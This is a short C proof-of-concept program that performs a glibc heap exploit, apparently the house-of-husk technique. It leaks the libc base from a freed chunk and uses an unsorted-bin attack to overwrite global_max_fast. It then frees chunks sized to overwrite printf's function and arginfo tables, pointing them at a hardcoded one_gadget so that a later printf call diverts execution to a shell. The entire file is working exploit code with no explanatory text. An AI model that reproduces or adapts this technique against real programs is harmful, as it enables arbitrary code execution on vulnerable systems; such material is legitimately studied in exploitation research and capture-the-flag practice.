#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>
#include<string.h>
#define MAIN_ARENA       0x3ebc40
#define MAIN_ARENA_DELTA 0x60
#define GLOBAL_MAX_FAST  0x3ed940
#define PRINTF_FUNCTABLE 0x3f0658
#define PRINTF_ARGINFO   0x3ec870
#define ONE_GADGET       0xe5863
#define size(offset) ((2*offset)-0x10)

int main()
{
	setbuf(stdout,NULL);
	unsigned long *p[10];
	p[0]=malloc(0x500);
	p[1]=malloc(size(PRINTF_FUNCTABLE-MAIN_ARENA));
	p[2]=malloc(size(PRINTF_ARGINFO-MAIN_ARENA));
	p[3]=malloc(0x500);
	free(p[0]);
	unsigned long libc_base=(*(p[0]))-MAIN_ARENA-MAIN_ARENA_DELTA;
	printf("libc_base= %#lx\n",libc_base);
	*(p[2]+86)=libc_base+ONE_GADGET;
	printf("%p\n",*(p[2]+86));
	 printf("p0 fwd pointer = %p\n",*(p[0]));
        printf("p0 bk pointer = %p\n",*(p[0]+1));
	*(p[0]+1)=libc_base+GLOBAL_MAX_FAST-0x10;
	 printf("p0 fwd pointer = %p\n",*(p[0]));
        printf("p0 bk pointer = %p\n",*(p[0]+1));
	printf("Global_max_bins=%#lx\n",*(unsigned long *)(libc_base+GLOBAL_MAX_FAST));
	p[0]=malloc(0x500);
	printf("Global_max_bins=%#lx\n",*(unsigned long *)(libc_base+GLOBAL_MAX_FAST));
	free(p[1]);
	free(p[2]);
	printf("%X",0);
	return 0;
}
	
